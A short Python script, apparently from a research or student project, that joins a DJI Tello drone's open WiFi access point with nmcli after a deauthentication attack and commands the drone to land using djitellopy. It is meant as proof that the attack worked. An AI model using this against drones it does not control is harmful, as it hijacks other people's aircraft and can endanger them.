# test to see if only one device can be connected to the drone at a time
# test this further - then this script working could be proof of a successful deauth attack

"""
The purpose of this snippet is so that once a drone has experienced a deauthentication
attack we can attempt to connect to the drone's access point (over WiFi) and use our
DJITelloPy library to land the drone

This will give a better visual for the session so we can see which drones are actually being
deauthenticated
"""

import time
import os
from djitellopy import Tello

#standard command

droneESSID = 'TELLO-941A77' # this should come from the network scan and be stored

os.system("nmcli d wifi connect {0} password ''".format(droneESSID))
time.sleep(5) #wait for the connection to establish

#Use the DJITelloPy library to make the drone land
drone = Tello()
drone.connect()

# a try catch expression is used here because if the drone is already landed or has an error
# due to network connectivity for example it will throw an  error and the script will stop
try:
    drone.land()

    #Disconnect from drone's access point
    os.system(f'nmcli d wifi disconnect {droneESSID}')
except:
    print('Drone already landed or has a system error')